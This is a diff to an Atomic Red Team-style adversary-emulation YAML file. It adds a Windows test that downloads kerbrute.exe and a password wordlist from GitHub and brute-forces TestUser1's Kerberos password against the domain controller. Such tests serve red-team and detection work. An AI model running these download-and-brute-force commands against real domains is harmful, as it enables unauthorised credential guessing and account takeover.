@@ -198,3 +198,37 @@ atomic_tests:
     cleanup_command: |
       userdel target
     name: sh
+- name: Password Brute User using Kerbrute Tool
+  description: |  
+    Bruteforce a single user's password from a wordlist
+  supported_platforms:
+  - windows
+  input_arguments:
+    domaincontroller:
+      description: Domain controller where test will be run
+      type: String
+      default: $ENV:userdnsdomain
+    domain:
+      description: Domain where you will be testing
+      type: String
+      default: $ENV:userdomain
+  dependency_executor_name: powershell
+  dependencies:
+  - description: |
+      kerbrute.exe must exist in $env:temp
+    prereq_command: |
+      if (test-path $env:temp\kerbrute.exe){exit 0} else {exit 1}
+    get_prereq_command: |
+      invoke-webrequest "https://github.com/ropnop/kerbrute/releases/download/v1.0.3/kerbrute_windows_386.exe" -outfile "$env:temp\kerbrute.exe"
+  - description: |
+      bruteuser.txt must exist in $env:temp
+    prereq_command: |
+      if (test-path $env:temp\bruteuser.txt){exit 0} else {exit 1}
+    get_prereq_command: |
+      invoke-webrequest "https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1110.001/src/bruteuser.txt?raw=true" -outfile "$env:temp\bruteuser.txt"
+  executor:
+    name: powershell
+    elevation_required: false
+    command: |
+      cd $env:temp
+      .\kerbrute.exe bruteuser --dc #{domaincontroller} -d #{domain} $env:temp\bruteuser.txt TestUser1 
